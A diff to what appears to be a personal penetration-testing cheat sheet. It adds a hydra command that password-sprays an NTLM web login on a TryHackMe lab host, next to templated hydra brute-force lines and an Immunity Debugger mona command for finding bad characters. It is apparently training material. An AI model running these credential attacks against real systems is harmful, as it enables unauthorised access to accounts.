@@ -53,6 +53,11 @@ hydra -t -V -l <USERNAME> -P <PASSWORD_LIST> <SERVICE>://<IP_ADDRESS>
 hydra -t -V -l <USERNAME> -P <PASSWORD_LIST> http-post-form <IP_ADDRESS> "<DIRECTORY> : <RAW_POST_REQUEST> <ERROR_MESSAGE>"
 ```
 
+### hydra (pop up login page)
+```
+hydra -L usernames.txt -p Changeme123  ntlmauth.za.tryhackme.com http-get / -V
+```
+
 ### Immunity Debugger (Finding bad characters)
 ```
 !mona bytearray -b "\x00"
